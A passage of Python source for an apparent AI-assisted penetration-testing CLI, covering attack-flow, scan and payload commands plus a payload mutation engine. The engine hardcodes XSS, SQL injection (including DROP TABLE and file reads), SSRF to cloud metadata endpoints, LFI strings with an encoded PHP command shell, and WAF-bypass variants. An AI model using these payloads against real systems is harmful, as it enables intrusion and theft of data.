        attack_types = [a.strip() for a in attack_flow.split(",")]

        # Create session if not exists
        if not ai_assistant.current_session:
            target = analyze or "multi-target"
            ai_assistant.create_session(target)

        flow_data = ai_assistant.generate_attack_flow(
            attack_types, technique, analyze, persona
        )

        if "error" in flow_data:
            click.secho(f"❌ {flow_data['error']}", fg="red")
            return

        click.secho("\n⚔️  Multi-Stage Attack Flow", fg="red", bold=True)
        click.secho(f"Attack Chain: {' → '.join(attack_types)}", fg="yellow")
        click.secho(f"Technique: {technique or 'adaptive'}", fg="blue")
        click.secho(
            f"Risk Level: {flow_data['risk_level']}",
            fg="red" if flow_data["risk_level"] == "CRITICAL" else "yellow",
        )

        if persona:
            click.secho(f"Persona: {persona.upper()}", fg="magenta")

        click.secho(f"\n{flow_data['attack_flow']}", fg="white")

        # Show MITRE mapping if verbose
        if verbose and flow_data.get("mitre_mapping"):
            click.secho("\n🎯 MITRE ATT&CK Mapping:", fg="cyan", bold=True)
            for attack_type, techniques in flow_data["mitre_mapping"].items():
                if techniques:
                    click.secho(
                        f"  {attack_type.upper()}: {', '.join(techniques)}", fg="green"
                    )

        # Save attack flow to file
        flow_file = f"attack_flow_{'_'.join(attack_types)}_{int(time.time())}.json"
        with open(flow_file, "w") as f:
            json.dump(flow_data, f, indent=2)

        if verbose:
            click.secho(f"💾 Attack flow saved to: {flow_file}", fg="green")

        # Save chat if requested
        if save_chat:
            if ai_assistant.save_chat_history(save_chat):
                click.secho(f"💾 Chat saved to: {save_chat}", fg="green")
            else:
                click.secho(f"❌ Failed to save chat: {save_chat}", fg="red")

        return

    # AI-Powered Vulnerability Scanner
    if vuln_scan:
        if verbose:
            click.secho(
                f"[*] Starting AI vulnerability scan on {vuln_scan}...", fg="cyan"
            )

        # Create session if not exists
        if not ai_assistant.current_session:
            target = "vulnerability_scan"
            ai_assistant.create_session(target)

        scan_results = ai_assistant.scan_endpoints_with_ai(
            vuln_scan, scan_type, persona, integration
        )

        if "error" in scan_results:
            click.secho(f"❌ {scan_results['error']}", fg="red")
            return

        click.secho("\n🔍 AI-Powered Vulnerability Scan Results", fg="red", bold=True)
        click.secho(f"Source: {vuln_scan}", fg="blue")
        click.secho(f"Scan Type: {scan_type.upper()}", fg="blue")
        click.secho(
            f"Endpoints: {scan_results['endpoint_metadata']['total_endpoints']}",
            fg="blue",
        )

        if persona:
            click.secho(f"Persona: {persona.upper()}", fg="magenta")

        # Display risk assessment
        risk_assessment = scan_results["risk_assessment"]
        click.secho("\n📊 Risk Assessment:", fg="yellow", bold=True)
        click.secho(
            f"  Composite Score: {risk_assessment['composite_score']}/10", fg="white"
        )
        click.secho(
            f"  Risk Level: {risk_assessment['risk_level']}",
            fg="red" if risk_assessment["risk_level"] == "CRITICAL" else "yellow",
        )
        click.secho(
            f"  Recommendation: {risk_assessment['recommendation']}", fg="white"
        )

        # Display integration insights
        insights = scan_results["integration_insights"]
        if insights and verbose:
            click.secho("\n🔗 ReconCLI Integration Insights:", fg="cyan", bold=True)
            for insight in insights[:5]:
                click.secho(f"  • {insight}", fg="green")

        # Display vulnerability tests
        vuln_tests = scan_results["vulnerability_tests"]
        if verbose and vuln_tests:
            click.secho("\n🎯 Vulnerability Test Categories:", fg="magenta", bold=True)
            for test_type, test_data in vuln_tests.items():
                click.secho(
                    f"  {test_type.upper()}: {test_data.get('description', 'N/A')}",
                    fg="white",
                )

        # Display AI analysis
        click.secho(
            f"\n🧠 AI Vulnerability Analysis:\n{scan_results['ai_analysis']}",
            fg="green",
        )

        # Display recommendations
        recommendations = scan_results["recommended_actions"]
        if recommendations:
            click.secho("\n💡 Security Recommendations:", fg="yellow", bold=True)
            for i, rec in enumerate(recommendations[:10], 1):
                click.secho(f"{i}. {rec}", fg="green")

        # Display compliance mapping
        compliance = scan_results["compliance_mapping"]
        if verbose and compliance:
            click.secho("\n⚖️  Compliance Framework Mapping:", fg="blue", bold=True)
            for framework, requirements in compliance.items():
                if requirements:
                    click.secho(
                        f"  {framework.upper()}: {', '.join(requirements[:3])}",
                        fg="white",
                    )

        # Save scan results to file
        scan_filename = f"vuln_scan_{scan_type}_{int(time.time())}.json"
        with open(scan_filename, "w") as f:
            json.dump(scan_results, f, indent=2)

        if verbose:
            click.secho(
                f"💾 Vulnerability scan results saved to: {scan_filename}", fg="green"
            )

        # Generate detailed vulnerability report
        if scan_type in ["comprehensive", "deep", "compliance"]:
            report_filename = f"vuln_report_{scan_type}_{int(time.time())}.md"
            markdown_content = f"""# AI-Powered Vulnerability Assessment Report

**Generated:** {scan_results["scan_metadata"]["timestamp"]}
**Source:** {vuln_scan}
**Scan Type:** {scan_type.upper()}
**Persona:** {persona or "default"}

## Executive Summary

### Risk Assessment
- **Composite Score:** {risk_assessment["composite_score"]}/10
- **Risk Level:** {risk_assessment["risk_level"]}
- **Endpoints Scanned:** {scan_results["endpoint_metadata"]["total_endpoints"]}

### Recommendation
{risk_assessment["recommendation"]}

## Technical Analysis

{scan_results["ai_analysis"]}

## Integration Insights

{chr(10).join(f"- {insight}" for insight in insights[:10])}

## Security Recommendations

{chr(10).join(f"{i}. {rec}" for i, rec in enumerate(recommendations[:15], 1))}

## Compliance Mapping

{chr(10).join(f"### {framework.upper()}" + chr(10) + chr(10).join(f"- {req}" for req in reqs) for framework, reqs in compliance.items() if reqs)}

---
*Report generated by ReconCLI AI Vulnerability Scanner*
"""

            with open(report_filename, "w") as f:
                f.write(markdown_content)

            click.secho(
                f"📄 Detailed vulnerability report saved to: {report_filename}",
                fg="green",
            )

        # Save chat if requested
        if save_chat:
            if ai_assistant.save_chat_history(save_chat):
                click.secho(f"💾 Chat saved to: {save_chat}", fg="green")
            else:
                click.secho(f"❌ Failed to save chat: {save_chat}", fg="red")

        return

    # Interactive mode
    if interactive:
        click.secho("\n🤖 Interactive AI Assistant Mode", fg="cyan", bold=True)
        click.secho("Type 'quit' or 'exit' to leave, 'help' for commands", fg="yellow")

        while True:
            try:
                user_input = click.prompt("\n💬 You", type=str, default="")
            except click.Abort:
                break

            if user_input.lower() in ["quit", "exit"]:
                break
            elif user_input.lower() == "help":
                click.secho(
                    """
Available commands:
- Any recon question or request
- 'payload <type>' - Generate payload
- 'plan <domain>' - Create recon plan
- 'analyze <domain>' - Analyze target
- 'session info' - Show session details
- 'providers' - List AI providers
""",
                    fg="blue",
                )
                continue
            elif user_input.lower() == "providers":
                click.secho(
                    f"Available: {', '.join(ai_assistant.get_available_providers())}",
                    fg="green",
                )
                continue
            elif user_input.lower() == "session info" and ai_assistant.current_session:
                click.secho(
                    f"Session: {ai_assistant.current_session.session_id}", fg="blue"
                )
                click.secho(f"Target: {ai_assistant.current_session.target}", fg="blue")
                click.secho(
                    f"Queries: {len(ai_assistant.current_session.queries)}", fg="blue"
                )
                continue

            # Process AI request
            response = ai_assistant.ask_ai(
                user_input,
                provider=provider,
                persona=persona,
                use_cache=(ai_assistant.cache_manager is not None),
            )
            if response:
                click.secho(f"\n🧠 AI Assistant:\n{response}", fg="green")

        # Save chat if requested
        if save_chat:
            if ai_assistant.save_chat_history(save_chat):
                click.secho(f"💾 Chat saved to: {save_chat}", fg="green")
            else:
                click.secho(f"❌ Failed to save chat: {save_chat}", fg="red")

        return

    # Generate payload
    if payload:
        if verbose:
            click.secho(f"[*] Generating {payload.upper()} payload...", fg="cyan")

        payload_data = ai_assistant.generate_payload(
            payload, context, technique, persona
        )

        if "error" in payload_data:
            click.secho(f"❌ {payload_data['error']}", fg="red")
            return

        click.secho(f"\n🎯 {payload.upper()} Payload Generation", fg="cyan", bold=True)
        click.secho(f"Context: {context or 'general'}", fg="blue")
        click.secho(f"Technique: {technique or 'all'}", fg="blue")

        # Advanced Payload Mutation Engine integration
        if mutate:
            click.secho("\n🔬 Advanced Payload Mutations:", fg="magenta", bold=True)

            # Use advanced mutator with new features
            if steganography or encoding or waf_profile != "auto":
                advanced_mutator = AdvancedPayloadMutator(
                    context=context or "html",
                    technique=payload,
                    waf_profile=waf_profile,
                    encoding_chains=encoding_chains,
                )
                mutations_data = advanced_mutator.mutate(count=mutations)

                click.secho(
                    f"Generated {len(mutations_data)} advanced mutation variants:",
                    fg="yellow",
                )

                for i, mutation_data in enumerate(mutations_data, 1):
                    mutation = mutation_data["payload"]
                    effectiveness = mutation_data["effectiveness_score"]
                    evasion = mutation_data["evasion_rating"]
                    steganography_level = mutation_data["steganography_level"]

                    # Color code based on effectiveness
                    if effectiveness >= 0.8:
                        color = "green"
                    elif effectiveness >= 0.6:
                        color = "yellow"
                    else:
                        color = "white"

                    click.secho(f"{i:2d}. {mutation}", fg=color)

                    if verbose or effectiveness_scoring:
                        click.secho(
                            f"    Effectiveness: {effectiveness:.2f} | Evasion: {evasion} | Steganography: {steganography_level}",
                            fg="cyan",
                        )

                        if mutation_data["encoding_applied"]:
                            click.secho(
                                f"    Encodings: {', '.join(mutation_data['encoding_applied'])}",
                                fg="blue",
                            )

                        if mutation_data["bypass_techniques"]:
                            click.secho(
                                f"    Bypasses: {', '.join(mutation_data['bypass_techniques'])}",
                                fg="magenta",
                            )

                # Add advanced mutations to payload data
                payload_data["advanced_mutations"] = {
                    "count": len(mutations_data),
                    "technique": payload,
                    "context": context or "html",
                    "waf_profile": waf_profile,
                    "encoding_chains": encoding_chains,
                    "steganography_enabled": steganography,
                    "variants": mutations_data,
                }

            else:
                # Use legacy mutator for backward compatibility
                mutator = PayloadMutator(context=context or "html", technique=payload)
                mutations_list = mutator.mutate()

                # Limit mutations if requested
                if mutations < len(mutations_list):
                    mutations_list = mutations_list[:mutations]

                click.secho(
                    f"Generated {len(mutations_list)} mutation variants:", fg="yellow"
                )
                for i, mutation in enumerate(mutations_list, 1):
                    click.secho(f"{i:2d}. {mutation}", fg="white")

                # Add mutations to payload data
                payload_data["mutations"] = {
                    "count": len(mutations_list),
                    "technique": payload,
                    "context": context or "html",
                    "variants": mutations_list,
                }

        click.secho(f"\n{payload_data['payloads']}", fg="white")

        # Save to file
        payload_file = f"{payload}_{context or 'general'}_{int(time.time())}.json"
        with open(payload_file, "w") as f:
            json.dump(payload_data, f, indent=2)

        if verbose:
            click.secho(f"💾 Payload data saved to: {payload_file}", fg="green")

        # Save chat if requested
        if save_chat:
            if ai_assistant.save_chat_history(save_chat):
                click.secho(f"💾 Chat saved to: {save_chat}", fg="green")
            else:
                click.secho(f"❌ Failed to save chat: {save_chat}", fg="red")

    # Generate reconnaissance plan
    elif plan:
        if verbose:
            click.secho(f"[*] Generating recon plan for {plan}...", fg="cyan")

        # Create session if not exists
        if not ai_assistant.current_session:
            ai_assistant.create_session(plan)

        plan_data = ai_assistant.generate_recon_plan(plan, scope, persona)

        click.secho(f"\n🎯 Reconnaissance Plan: {plan}", fg="cyan", bold=True)
        click.secho(f"Scope: {scope}", fg="blue")
        click.secho(f"Phases: {len(plan_data['phases'])}", fg="blue")

        for i, phase in enumerate(plan_data["phases"], 1):
            click.secho(f"\n📋 Phase {i}: {phase['name']}", fg="yellow", bold=True)
            click.secho(f"Description: {phase['description']}", fg="white")
            click.secho(f"Tools: {', '.join(phase['tools'])}", fg="green")
            click.secho(f"Estimated time: {phase['estimated_time']}", fg="blue")

            if verbose:
                click.secho("Commands:", fg="cyan")
                for cmd in phase["commands"]:
                    click.secho(f"  {cmd}", fg="white")

        if plan_data.get("ai_recommendations"):
            click.secho(
                f"\n🧠 AI Recommendations:\n{plan_data['ai_recommendations']}",
                fg="green",
            )

        # Export plan if requested
        if export_plan:
            with open(export_plan, "w") as f:
                json.dump(plan_data, f, indent=2)

            click.secho(f"💾 Plan exported to: {export_plan}", fg="green")

        # Save chat if requested
        if save_chat:
            if ai_assistant.save_chat_history(save_chat):
                click.secho(f"💾 Chat saved to: {save_chat}", fg="green")
            else:
                click.secho(f"❌ Failed to save chat: {save_chat}", fg="red")

    # Analyze target
    elif analyze:
        if verbose:
            click.secho(f"[*] Analyzing target {analyze}...", fg="cyan")

        analysis_data = ai_assistant.analyze_target(analyze, persona)

        click.secho(f"\n🔍 Target Analysis: {analyze}", fg="cyan", bold=True)
        click.secho(f"{analysis_data['analysis']}", fg="white")

        if analysis_data["recommendations"]:
            click.secho("\n💡 Key Recommendations:", fg="yellow", bold=True)
            for i, rec in enumerate(analysis_data["recommendations"], 1):
                click.secho(f"{i}. {rec}", fg="green")

        # Save analysis
        analysis_file = f"analysis_{analyze.replace('.', '_')}_{int(time.time())}.json"
        with open(analysis_file, "w") as f:
            json.dump(analysis_data, f, indent=2)

        if verbose:
            click.secho(f"💾 Analysis saved to: {analysis_file}", fg="green")

        # Save chat if requested
        if save_chat:
            if ai_assistant.save_chat_history(save_chat):
                click.secho(f"💾 Chat saved to: {save_chat}", fg="green")
            else:
                click.secho(f"❌ Failed to save chat: {save_chat}", fg="red")

    # Direct prompt
    elif prompt:
        if verbose:
            click.secho("[*] Processing prompt...", fg="cyan")

        response = ai_assistant.ask_ai(
            prompt,
            provider=provider,
            context="prompt",
            persona=persona,
            use_cache=(ai_assistant.cache_manager is not None),
        )

        if response:
            click.secho(f"\n🧠 AI Assistant:\n{response}", fg="green")
        else:
            click.secho("❌ No response from AI", fg="red")

        # Save chat if requested
        if save_chat:
            if ai_assistant.save_chat_history(save_chat):
                click.secho(f"💾 Chat saved to: {save_chat}", fg="green")
            else:
                click.secho(f"❌ Failed to save chat: {save_chat}", fg="red")

    # List available sessions
    if list_sessions:
        sessions = list(ai_assistant.session_dir.glob("*.json"))
        if sessions:
            click.secho("\n📁 Available Sessions:", fg="cyan", bold=True)
            for session_file in sessions:
                try:
                    with open(session_file, "r") as f:
                        session_data = json.load(f)
                    click.secho(
                        f"  {session_data['session_id']}: {session_data['target']} "
                        f"({session_data['start_time'][:19]})",
                        fg="white",
                    )
                except Exception:
                    continue
        else:
            click.secho("No sessions found.", fg="yellow")
        return

    # Show chatlog insights
    if chatlog_insights:
        if ai_assistant.current_session:
            insights = ai_assistant.get_session_insights()
            click.secho(
                "\n📊 Chatlog-Driven Recon Session Insights", fg="cyan", bold=True
            )

            session_overview = insights.get("session_overview", {})
            click.secho(
                f"Session ID: {session_overview.get('session_id', 'N/A')}", fg="white"
            )
            click.secho(f"Target: {session_overview.get('target', 'N/A')}", fg="white")
            click.secho(
                f"Current Phase: {session_overview.get('current_phase', 'N/A')}",
                fg="yellow",
            )
            click.secho(
                f"Completion: {session_overview.get('completion_percentage', 0):.1f}%",
                fg="green",
            )

            execution_metrics = insights.get("execution_metrics", {})
            click.secho(
                f"Total Steps: {execution_metrics.get('total_steps', 0)}", fg="white"
            )
            click.secho(
                f"Successful Steps: {execution_metrics.get('successful_steps', 0)}",
                fg="green",
            )
            click.secho(
                f"Failed Steps: {execution_metrics.get('total_steps', 0) - execution_metrics.get('successful_steps', 0)}",
                fg="red",
            )

            discovered_assets = insights.get("discovered_assets", {})
            if any(discovered_assets.values()):
                click.secho("\n🎯 Discovered Assets:", fg="cyan")
                for asset_type, count in discovered_assets.items():
                    if count > 0:
                        click.secho(f"  {asset_type}: {count}", fg="white")

            vulnerability_summary = insights.get("vulnerability_summary", {})
            if any(vulnerability_summary.values()):
                click.secho("\n🔍 Vulnerability Summary:", fg="red")
                for vuln_type, count in vulnerability_summary.items():
                    if count > 0:
                        click.secho(f"  {vuln_type}: {count}", fg="white")

            # Show AI recommendations if available
            recommendations = ai_assistant.get_chatlog_driven_recommendations()
            if (
                recommendations
                and "next_step_suggestions" in recommendations
                and recommendations["next_step_suggestions"]
            ):
                click.secho(
                    "\n🤖 AI-Powered Next Step Recommendations:", fg="green", bold=True
                )
                for i, rec in enumerate(recommendations["next_step_suggestions"], 1):
                    click.secho(
                        f"{i}. {rec['command']} (confidence: {rec['confidence']:.1%})",
                        fg="white",
                    )
                    click.secho(f"   Reason: {rec['reasoning']}", fg="yellow")
            else:
                click.secho(
                    "\n🤖 No AI recommendations available yet. Add some recon steps first.",
                    fg="yellow",
                )
        else:
            click.secho(
                "❌ No active session found. Create a session first with --new-session",
                fg="red",
            )
        return

    # Show usage if no options provided
    else:
        click.secho("🧠 AI-Powered Reconnaissance Assistant", fg="cyan", bold=True)
        click.secho("Use --help for detailed usage or try:", fg="yellow")
        click.secho("  --prompt 'How to enumerate subdomains effectively?'", fg="white")
        click.secho("  --payload xss --context html --persona bugbounty", fg="white")
        click.secho(
            "  --plan example.com --scope comprehensive --persona redteam", fg="white"
        )
        click.secho("  --analyze example.com --persona pentester", fg="white")
        click.secho(
            "  --attack-flow ssrf,xss,lfi --technique gopher --persona redteam",
            fg="white",
        )
        click.secho(
            "  --report attack_flow_file.json --persona pentester",
            fg="white",
        )
        click.secho(
            "  --interactive --persona trainer --save-chat training_session", fg="white"
        )
        click.secho("  --load-chat previous_session --interactive", fg="white")

        click.secho("\n⚔️  Advanced Attack Flows:", fg="red", bold=True)
        click.secho("  --attack-flow ssrf,xss      # SSRF → XSS chain", fg="red")
        click.secho(
            "  --attack-flow sqli,lfi,xss  # SQL → LFI → XSS escalation", fg="red"
        )
        click.secho(
            "  --attack-flow ssti,lfi      # SSTI → LFI privilege escalation", fg="red"
        )

        click.secho("\n📊 Report Generation:", fg="blue", bold=True)
        click.secho(
            "  --report flow.json --persona pentester   # Professional report",
            fg="blue",
        )
        click.secho(
            "  --report flow.json --persona redteam     # Tactical assessment",
            fg="blue",
        )
        click.secho(
            "  --report flow.json --persona bugbounty   # Bug bounty impact", fg="blue"
        )

        click.secho("\n🔧 Advanced Techniques:", fg="cyan", bold=True)
        click.secho(
            "  --technique gopher          # SSRF with Gopher protocol", fg="cyan"
        )
        click.secho(
            "  --technique reflection      # Reflected XSS variations", fg="cyan"
        )
        click.secho(
            "  --technique union           # SQL injection UNION attacks", fg="cyan"
        )
        click.secho("  --technique wrapper         # LFI with PHP wrappers", fg="cyan")

        click.secho("\n🔬 Advanced Payload Mutation Engine:", fg="magenta", bold=True)
        click.secho(
            "  --payload xss --mutate --mutations 20      # XSS WAF bypass mutations",
            fg="magenta",
        )
        click.secho(
            "  --payload sqli --mutate --mutations 15     # SQL injection variants",
            fg="magenta",
        )
        click.secho(
            "  --payload ssrf --mutate --context cloud   # SSRF protocol mutations",
            fg="magenta",
        )

        click.secho("\n🔍 AI-Powered Vulnerability Scanner:", fg="red", bold=True)
        click.secho(
            "  --vuln-scan endpoints.txt --scan-type quick --persona bugbounty",
            fg="red",
        )
        click.secho(
            "  --vuln-scan urlcli_output.json --scan-type comprehensive --integration",
            fg="red",
        )
        click.secho(
            "  --vuln-scan discovered_urls.txt --scan-type compliance --persona pentester",
            fg="red",
        )
        click.secho(
            "  --vuln-scan httpcli_results.json --scan-type deep --persona redteam",
            fg="red",
        )

        click.secho("\n📋 Scan Types:", fg="magenta", bold=True)
        click.secho("  quick          - Fast common vulnerability scan", fg="white")
        click.secho("  comprehensive  - Complete vulnerability assessment", fg="white")
        click.secho("  focused        - Technology-specific testing", fg="white")
        click.secho("  deep           - Advanced threat simulation", fg="white")
        click.secho("  compliance     - OWASP Top 10, PCI DSS, GDPR", fg="white")

        click.secho("\n🎭 Available Personas:", fg="cyan", bold=True)
        click.secho("  redteam    - Stealth operations & evasion techniques", fg="red")
        click.secho(
            "  bugbounty  - Quick wins & high-impact vulnerabilities", fg="yellow"
        )
        click.secho(
            "  pentester  - Professional methodology & documentation", fg="blue"
        )
        click.secho(
            "  trainer    - Educational & step-by-step explanations", fg="green"
        )
        click.secho(
            "  osint      - Passive intelligence & public sources", fg="magenta"
        )

        if ai_assistant.get_available_providers():
            click.secho(
                f"\n✅ Available AI providers: {', '.join(ai_assistant.get_available_providers())}",
                fg="green",
            )
        else:
            click.secho("\n❌ No AI providers configured. Set your API keys:", fg="red")
            click.secho("  export OPENAI_API_KEY='your-key'", fg="white")
            click.secho("  export ANTHROPIC_API_KEY='your-key'", fg="white")
            click.secho("  export GOOGLE_API_KEY='your-key'", fg="white")

    # Handle cache stats at the end after all initializations
    if cache_stats:
        # Initialize cache manager for stats even if cache flag is not set
        if not ai_assistant.cache_manager:
            # Try to get default cache directory
            cache_dir_path = Path.home() / ".reconcli" / "ai_sessions" / "cache"
        else:
            cache_dir_path = Path(ai_assistant.config.cache.cache_dir)

        try:
            if cache_dir_path.exists():
                cache_files = list(cache_dir_path.glob("*.json"))
                total_size = (
                    sum(f.stat().st_size for f in cache_files) if cache_files else 0
                )
                click.secho("📊 Cache Statistics", fg="cyan", bold=True)
                click.secho(f"Cache directory: {cache_dir_path}", fg="blue")
                click.secho(f"Cached responses: {len(cache_files)}", fg="blue")
                click.secho(f"Total size: {total_size / 1024:.1f} KB", fg="blue")

                if ai_assistant.cache_manager:
                    click.secho(
                        f"Max age: {ai_assistant.config.cache.max_age_hours} hours",
                        fg="blue",
                    )
                else:
                    click.secho("Max age: 24 hours (default)", fg="blue")

                # Show database statistics if available
                # Check if database files exist and try to connect
                db_files_found = []
                search_paths = [
                    cache_dir_path.parent,  # Session directory
                    Path.cwd(),  # Current working directory
                    Path.home()
                    / ".reconcli"
                    / "databases",  # Default database location
                ]

                for search_path in search_paths:
                    if search_path.exists():
                        db_files = list(search_path.glob("*.db"))
                        db_files_found.extend(db_files)

                if db_files_found:
                    click.secho("\n🗄️  Database Statistics", fg="cyan", bold=True)
                    for db_file in db_files_found:
                        try:
                            # Try to connect to database and get stats
                            db_conn = sqlite3.connect(str(db_file))
                            cursor = db_conn.cursor()

                            # Check if it's an AI database (has our tables)
                            cursor.execute(
                                """
                                SELECT name FROM sqlite_master 
                                WHERE type='table' AND name='ai_queries'
                            """
                            )
                            if cursor.fetchone():
                                click.secho(f"Database file: {db_file}", fg="blue")

                                # Get table counts
                                tables = [
                                    "ai_queries",
                                    "payload_results",
                                    "vuln_scan_results",
                                    "recon_plans",
                                    "attack_chains",
                                ]
                                for table in tables:
                                    cursor.execute(f"SELECT COUNT(*) FROM {table}")
                                    count = cursor.fetchone()[0]
                                    table_display = table.replace("_", " ").title()
                                    click.secho(f"{table_display}: {count}", fg="blue")

                                # Get database size
                                db_size_mb = db_file.stat().st_size / (1024 * 1024)
                                click.secho(
                                    f"Database size: {db_size_mb:.2f} MB", fg="blue"
                                )
                                click.secho("", fg="blue")  # Empty line for spacing

                            db_conn.close()
                        except Exception as e:
                            click.secho(
                                f"Error reading database {db_file.name}: {e}",
                                fg="yellow",
                            )
                elif (
                    hasattr(ai_assistant, "db_connection")
                    and ai_assistant.db_connection
                ):
                    # Fallback to current connection if available
                    db_stats = ai_assistant.get_database_stats()
                    if "error" not in db_stats:
                        click.secho("\n🗄️  Database Statistics", fg="cyan", bold=True)
                        click.secho(
                            f"Database file: {getattr(ai_assistant, 'db_path', 'Unknown')}",
                            fg="blue",
                        )
                        click.secho(
                            f"AI queries: {db_stats.get('ai_queries_count', 0)}",
                            fg="blue",
                        )
                        click.secho(
                            f"Payload results: {db_stats.get('payload_results_count', 0)}",
                            fg="blue",
                        )
                        click.secho(
                            f"Vuln scan results: {db_stats.get('vuln_scan_results_count', 0)}",
                            fg="blue",
                        )
                        click.secho(
                            f"Recon plans: {db_stats.get('recon_plans_count', 0)}",
                            fg="blue",
                        )
                        click.secho(
                            f"Attack chains: {db_stats.get('attack_chains_count', 0)}",
                            fg="blue",
                        )
                        if "database_size_mb" in db_stats:
                            click.secho(
                                f"Database size: {db_stats['database_size_mb']} MB",
                                fg="blue",
                            )
                    else:
                        click.secho(f"Database error: {db_stats['error']}", fg="red")

                click.secho("Cache status: Available", fg="green")
            else:
                click.secho("📊 Cache Statistics", fg="cyan", bold=True)
                click.secho(f"Cache directory: {cache_dir_path}", fg="blue")
                click.secho("Cached responses: 0", fg="blue")
                click.secho("Total size: 0.0 KB", fg="blue")
                click.secho("Cache status: No cache directory found", fg="yellow")
        except Exception as e:
            click.secho(f"❌ Failed to get cache stats: {e}", fg="red")
        return


# === Payload Mutation Engine ===


class AdvancedPayloadMutator:
    """Enhanced payload mutation engine with WAF bypass and advanced encoding"""

    def __init__(
        self, context="html", technique="xss", waf_profile="auto", encoding_chains=2
    ):
        self.context = context.lower()
        self.technique = technique.lower()
        self.waf_profile = waf_profile.lower()
        self.encoding_chains = encoding_chains

        # Encoding functions
        self.encoders = {
            "url": urllib.parse.quote,
            "double_url": lambda x: urllib.parse.quote(urllib.parse.quote(x)),
            "html": lambda x: x.replace("<", "&lt;")
            .replace(">", "&gt;")
            .replace('"', "&quot;")
            .replace("'", "&#x27;"),
            "base64": lambda x: base64.b64encode(x.encode()).decode(),
            "hex": lambda x: "".join(f"\\x{ord(c):02x}" for c in x),
            "unicode": lambda x: "".join(f"\\u{ord(c):04x}" for c in x),
            "mixed_case": lambda x: "".join(
                c.upper() if i % 2 else c.lower() for i, c in enumerate(x)
            ),
        }

        # WAF-specific bypass patterns
        self.waf_bypass_patterns = self._load_waf_patterns()

        # Obfuscation techniques
        self.obfuscation_techniques = [
            "comment_insertion",
            "whitespace_variation",
            "case_alternation",
            "encoding_mix",
            "parameter_pollution",
            "protocol_smuggling",
        ]

    def _load_waf_patterns(self) -> Dict[str, List[str]]:
        """Load WAF-specific bypass patterns"""
        return {
            "cloudflare": [
                "union/**/select",
                "uni%6fn sel%65ct",
                "UNION/*!32302*/SELECT",
                "<SCR%00IPT>alert(1)</SCR%00IPT>",
                '<img src=x onerror="alert`1`">',
                "javascript:/**/alert(1)",
            ],
            "aws": [
                "union%0aselect",
                "union%0dselect",
                "/*!union*//*!select*/",
                "<script>alert(/xss/)</script>",
                "<svg/onload=alert(1)>",
                "file:///etc/passwd",
            ],
            "azure": [
                "union%23%0aselect",
                "/**/union/**/select/**/",
                '<iframe src="javascript:alert(1)">',
                "<img src=x onerror=alert(String.fromCharCode(88,83,83))>",
                "http://169.254.169.254/metadata/instance",
            ],
            "akamai": [
                "union%2bselect",
                "union%20/*!select*/",
                "<script>alert(document.domain)</script>",
                "<details open ontoggle=alert(1)>",
                "gopher://127.0.0.1:80/_",
            ],
        }

    def mutate(self, count: int = 10) -> List[Dict[str, Any]]:
        """Generate advanced payload mutations with metadata"""
        mutations = []

        if self.technique == "xss":
            base_payloads = self._get_xss_payloads()
        elif self.technique == "sqli":
            base_payloads = self._get_sqli_payloads()
        elif self.technique == "ssrf":
            base_payloads = self._get_ssrf_payloads()
        elif self.technique == "lfi":
            base_payloads = self._get_lfi_payloads()
        elif self.technique == "ssti":
            base_payloads = self._get_ssti_payloads()
        else:
            base_payloads = ["test_payload"]

        for i, base_payload in enumerate(base_payloads[:count]):
            # Apply encoding chains
            encoded_variants = self._apply_encoding_chains(base_payload)

            # Apply WAF-specific bypasses
            waf_variants = self._apply_waf_bypasses(base_payload)

            # Apply obfuscation techniques
            obfuscated_variants = self._apply_obfuscation(base_payload)

            # Combine all variants
            all_variants = (
                [base_payload] + encoded_variants + waf_variants + obfuscated_variants
            )

            for variant in all_variants[:count]:
                mutation_data = {
                    "payload": variant,
                    "original": base_payload,
                    "technique": self.technique,
                    "context": self.context,
                    "waf_profile": self.waf_profile,
                    "encoding_applied": self._detect_encoding(variant, base_payload),
                    "bypass_techniques": self._detect_bypass_techniques(variant),
                    "effectiveness_score": self._calculate_effectiveness_score(variant),
                    "steganography_level": self._detect_steganography(variant),
                    "evasion_rating": self._calculate_evasion_rating(variant),
                }
                mutations.append(mutation_data)

                if len(mutations) >= count:
                    break

            if len(mutations) >= count:
                break

        return mutations[:count]

    def _get_xss_payloads(self) -> List[str]:
        """Get XSS payload variants"""
        base_payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "javascript:alert(1)",
            "<iframe src=javascript:alert(1)>",
            "<details open ontoggle=alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            "<select onfocus=alert(1) autofocus>",
            "<textarea onfocus=alert(1) autofocus>",
            "<marquee onstart=alert(1)>",
        ]

        # Add context-specific variants
        if self.context == "attribute":
            base_payloads.extend(
                [
                    '" onload=alert(1) "',
                    "' onclick=alert(1) '",
                    '" onfocus=alert(1) autofocus="',
                ]
            )
        elif self.context == "javascript":
            base_payloads.extend(["';alert(1);//", '";alert(1);//', "\\';alert(1);//"])

        return base_payloads

    def _get_sqli_payloads(self) -> List[str]:
        """Get SQL injection payload variants"""
        return [
            "' OR '1'='1",
            "' OR 1=1 --",
            "' UNION SELECT null,null,null--",
            "'; DROP TABLE users; --",
            "' OR SLEEP(5) --",
            "' AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT version()))) --",
            "' UNION SELECT @@version,null,null --",
            "' OR (SELECT COUNT(*) FROM information_schema.tables) > 0 --",
            "' UNION SELECT load_file('/etc/passwd'),null,null --",
            "' OR EXISTS(SELECT * FROM users WHERE password='admin') --",
        ]

    def _get_ssrf_payloads(self) -> List[str]:
        """Get SSRF payload variants"""
        return [
            "http://127.0.0.1:80/",
            "http://169.254.169.254/latest/meta-data/",
            "file:///etc/passwd",
            "gopher://127.0.0.1:80/_GET / HTTP/1.1",
            "dict://127.0.0.1:11211/stat",
            "ldap://127.0.0.1:389/",
            "http://[::1]:80/",
            "http://0.0.0.0:22/",
            "http://localhost:3306/",
            "ftp://127.0.0.1:21/",
        ]

    def _get_lfi_payloads(self) -> List[str]:
        """Get LFI payload variants"""
        return [
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "php://filter/read=convert.base64-encode/resource=index.php",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
            "expect://id",
            "file:///etc/passwd",
            "/var/log/apache2/access.log",
            "C:\\windows\\system32\\drivers\\etc\\hosts",
            "../../../../../proc/self/environ",
        ]

    def _get_ssti_payloads(self) -> List[str]:
        """Get SSTI payload variants"""
        return [
            "{{7*7}}",
            "${7*7}",
            "<%=7*7%>",
